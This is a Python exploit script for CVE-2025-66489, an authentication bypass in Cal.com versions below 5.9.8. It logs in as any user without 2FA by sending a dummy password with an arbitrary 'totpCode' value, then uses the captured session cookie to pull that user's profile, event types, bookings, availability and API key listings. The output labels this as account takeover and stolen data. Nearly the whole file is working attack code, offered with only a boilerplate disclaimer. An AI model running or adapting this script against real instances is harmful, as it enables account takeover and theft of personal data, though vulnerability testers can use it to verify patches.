#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Cal.com Auth Bypass - Full Account Takeover (Vector 3)
# CVE            : CVE-2025-66489
# Vendor         : Cal.com
# Product        : Cal.com
# Affected       : < 5.9.8
# Type           : CWE-303 - Incorrect Implementation of Authentication Algorithm
# CVSS           : 9.8 (Critical)
# Platform       : Any (Web Application)
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2025
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
Cal.com Auth Bypass - Full Account Takeover (Vector 3)

Goes beyond authentication bypass to demonstrate the full impact:
1. Bypass authentication to get a valid session
2. Use the session to access sensitive API endpoints
3. Extract victim's personal data, bookings, API keys, etc.

ATTACK CHAIN:
  1. Bypass auth via totpCode injection → obtain session token
  2. Access /api/auth/session, /api/trpc/me/get, event types, bookings
  3. Access /api/trpc/apiKeys/list (can create persistent access)
  4. Full account takeover confirmed

PREREQUISITES:
  - Target Cal.com instance < 5.9.8
  - Valid email address of a user without 2FA enabled

REFERENCES:
  - CVE-2025-66489
"""

import sys
import json
import urllib.parse
import urllib.request
import urllib.error

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

DEFAULT_HOST = "localhost"
DEFAULT_PORT = 3000
DEFAULT_EMAIL = "victim@example.com"


class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def get_csrf(base_url):
    """Get fresh CSRF token and cookies."""
    req = urllib.request.Request(f"{base_url}/api/auth/csrf")
    with urllib.request.urlopen(req, timeout=10) as resp:
        data = json.loads(resp.read().decode())
        cookies = resp.headers.get_all("Set-Cookie") or []
        return data["csrfToken"], cookies


def bypass_login(base_url, email, csrf_token, csrf_cookies):
    """Execute the authentication bypass and return session cookie."""
    form_data = {
        "email": email,
        "password": "irrelevant",  # This password is never checked
        "totpCode": "000000",      # Any truthy value triggers the bypass
        "csrfToken": csrf_token,
        "callbackUrl": f"{base_url}/",
        "json": "true",
    }
    encoded = urllib.parse.urlencode(form_data).encode("utf-8")

    req = urllib.request.Request(
        f"{base_url}/api/auth/callback/credentials",
        data=encoded,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    cookie_str = "; ".join(c.split(";")[0] for c in csrf_cookies)
    req.add_header("Cookie", cookie_str)

    opener = urllib.request.build_opener(NoRedirectHandler)
    try:
        resp = opener.open(req, timeout=30)
        headers = resp.headers
    except urllib.error.HTTPError as e:
        headers = e.headers

    set_cookies = headers.get_all("Set-Cookie") or []
    for sc in set_cookies:
        if "next-auth.session-token" in sc:
            return sc.split(";")[0]
    return None


def api_request(base_url, path, session_cookie, method="GET", data=None):
    """Make an authenticated API request using the stolen session."""
    url = f"{base_url}{path}"
    req = urllib.request.Request(url, method=method)
    req.add_header("Cookie", session_cookie)
    req.add_header("Content-Type", "application/json")

    if data:
        req.data = json.dumps(data).encode("utf-8")

    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            body = resp.read().decode(errors="replace")
            try:
                return resp.status, json.loads(body)
            except json.JSONDecodeError:
                return resp.status, body
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        try:
            return e.code, json.loads(body)
        except json.JSONDecodeError:
            return e.code, body
    except Exception as e:
        return 0, str(e)


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    email = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_EMAIL

    base_url = f"http://{host}:{port}"

    print(f"{CYAN}{BOLD}")
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║  CVE-2025-66489 — Vector 3: Full Account Takeover Demo     ║")
    print("║  Bypass auth → Access sensitive endpoints → Steal data      ║")
    print("╚══════════════════════════════════════════════════════════════╝")
    print(f"{RESET}")
    print(f"Target: {base_url}")
    print(f"Victim: {email}\n")

    # Step 1: Bypass authentication
    print(f"{YELLOW}[*] Phase 1: Authentication Bypass{RESET}")
    csrf_token, csrf_cookies = get_csrf(base_url)
    session_cookie = bypass_login(base_url, email, csrf_token, csrf_cookies)

    if not session_cookie:
        print(f"{RED}[!] Login bypass failed — cannot proceed with account takeover{RESET}")
        return False

    print(f"{GREEN}[+] Got session cookie: {session_cookie[:50]}...{RESET}")

    # Step 2: Demonstrate access to sensitive endpoints
    print(f"\n{YELLOW}[*] Phase 2: Accessing Sensitive Endpoints{RESET}")

    endpoints_tested = 0
    endpoints_accessible = 0

    # 2a: Session info (user identity)
    print(f"\n  {BOLD}[2a] Session Info (/api/auth/session):{RESET}")
    status, data = api_request(base_url, "/api/auth/session", session_cookie)
    endpoints_tested += 1
    if status == 200 and isinstance(data, dict) and data.get("user"):
        endpoints_accessible += 1
        user = data["user"]
        print(f"  {GREEN}✓ Status {status} — Authenticated as:{RESET}")
        print(f"    Name:  {user.get('name', 'N/A')}")
        print(f"    Email: {user.get('email', 'N/A')}")
        print(f"    ID:    {user.get('id', 'N/A')}")
        print(f"    Role:  {user.get('role', 'N/A')}")
    else:
        print(f"  {RED}✗ Status {status} — Could not get session info{RESET}")

    # 2b: User profile / me endpoint (tRPC)
    # Cal.com v5.9.7 tRPC routes are at /api/trpc/<router>/<procedure>
    print(f"\n  {BOLD}[2b] User Profile (tRPC me/get):{RESET}")
    status, data = api_request(base_url, "/api/trpc/me/get", session_cookie)
    endpoints_tested += 1
    if status == 200:
        endpoints_accessible += 1
        if isinstance(data, dict):
            result = data.get("result", {}).get("data", {}).get("json", data)
            if isinstance(result, dict):
                print(f"  {GREEN}✓ Status {status} — Full profile data stolen:{RESET}")
                for key in ["username", "email", "name", "bio", "timeZone", "locale",
                            "theme", "identityProvider", "twoFactorEnabled",
                            "completedOnboarding"]:
                    if key in result:
                        print(f"    {key}: {result[key]}")
            else:
                print(f"  {GREEN}✓ Status {status} — Profile endpoint accessible{RESET}")
        else:
            print(f"  {GREEN}✓ Status {status} — Profile endpoint accessible{RESET}")
    else:
        print(f"  {YELLOW}✗ Status {status} — Profile endpoint returned error{RESET}")

    # 2c: Event types (scheduling configuration)
    print(f"\n  {BOLD}[2c] Event Types (tRPC eventTypes/getByViewer):{RESET}")
    status, data = api_request(base_url, "/api/trpc/eventTypes/getByViewer", session_cookie)
    endpoints_tested += 1
    if status == 200:
        endpoints_accessible += 1
        print(f"  {GREEN}✓ Status {status} — Event types accessible{RESET}")
        if isinstance(data, dict):
            result = data.get("result", {}).get("data", {}).get("json", {})
            if isinstance(result, dict):
                groups = result.get("eventTypeGroups", [])
                print(f"    Event type groups: {len(groups)}")
                for group in groups:
                    for et in group.get("eventTypes", []):
                        print(f"    → Event: {et.get('title', 'N/A')} ({et.get('slug', 'N/A')}) - {et.get('length', '?')}min")
    else:
        print(f"  {YELLOW}✗ Status {status} — Event types not available{RESET}")

    # 2d: Bookings
    print(f"\n  {BOLD}[2d] Bookings (tRPC bookings/get):{RESET}")
    bookings_input = urllib.parse.quote(json.dumps({"json": {"limit": 10, "filters": {"status": "upcoming"}}}))
    status, data = api_request(
        base_url,
        f"/api/trpc/bookings/get?input={bookings_input}",
        session_cookie,
    )
    endpoints_tested += 1
    if status == 200:
        endpoints_accessible += 1
        print(f"  {GREEN}✓ Status {status} — Bookings endpoint accessible{RESET}")
    else:
        print(f"  {YELLOW}✗ Status {status} — Bookings endpoint returned error (may need different input){RESET}")

    # 2e: Availability
    print(f"\n  {BOLD}[2e] Availability (tRPC availability/list):{RESET}")
    status, data = api_request(
        base_url,
        "/api/trpc/availability/list",
        session_cookie,
    )
    endpoints_tested += 1
    if status == 200:
        endpoints_accessible += 1
        print(f"  {GREEN}✓ Status {status} — Availability data accessible{RESET}")
        if isinstance(data, dict):
            result = data.get("result", {}).get("data", {}).get("json", {})
            if isinstance(result, dict):
                schedules = result.get("schedules", [])
                print(f"    Schedules: {len(schedules)}")
    else:
        print(f"  {YELLOW}✗ Status {status} — Availability endpoint returned error{RESET}")

    # 2f: API Keys
    print(f"\n  {BOLD}[2f] API Keys (tRPC apiKeys/list):{RESET}")
    status, data = api_request(base_url, "/api/trpc/apiKeys/list", session_cookie)
    endpoints_tested += 1
    if status == 200:
        endpoints_accessible += 1
        print(f"  {GREEN}✓ Status {status} — API keys endpoint accessible (can create/steal API keys){RESET}")
    else:
        print(f"  {YELLOW}✗ Status {status} — API keys endpoint returned error{RESET}")

    # Summary
    print(f"\n{BOLD}{'='*60}{RESET}")
    print(f"{BOLD}  ACCOUNT TAKEOVER RESULTS{RESET}")
    print(f"{BOLD}{'='*60}{RESET}")
    print(f"  Authentication bypass: {GREEN}SUCCESS{RESET}")
    print(f"  Endpoints tested:      {endpoints_tested}")
    print(f"  Endpoints accessible:  {endpoints_accessible}/{endpoints_tested}")
    print(f"  Access level:          Full authenticated user session")

    if endpoints_accessible >= 2:
        print(f"\n{GREEN}{BOLD}  ✅ FULL ACCOUNT TAKEOVER CONFIRMED{RESET}")
        print(f"  Attacker can access victim's calendar, bookings, profile,")
        print(f"  event types, and all authenticated endpoints.")
        return True
    else:
        print(f"\n{YELLOW}{BOLD}  ⚠  Auth bypass worked but API access limited{RESET}")
        return True  # Still a successful bypass


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
